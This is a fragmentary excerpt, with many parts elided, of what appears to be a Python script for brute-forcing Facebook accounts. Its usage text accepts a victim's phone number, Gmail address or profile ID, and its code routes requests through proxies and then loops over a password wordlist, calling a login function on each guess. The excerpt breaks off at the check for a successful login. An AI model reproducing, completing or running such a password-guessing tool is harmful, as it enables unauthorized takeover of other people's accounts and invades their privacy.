...
OPTIONS:
       |
    |--------
    | -t <target phone number> [OR] <target Gmail> [OR] <FACEBOOK ID>]    ::> Specify target Gmail [OR] Target Profile ID [OR] Target Phone Number
    |--------
...
def Main():
   ...
   if update:
    ...
    sys.exit(1)
        ...
        facebook.get_profile_id(target_profile)
        sys.exit(1)
        ...
        if proxy:
             ...
             if facebook.check_proxy(final_proxy):
                facebook.useProxy = final_proxy
                facebook.br.set_proxies({'https':facebook.useProxy, 'http':facebook.useProxy})
        ...
        facebook.banner(target,wordlist,single_passwd)
        ...
        for passwd in passwords:
                ...
                retCode = facebook.login(target, passwd)
                if retCode:
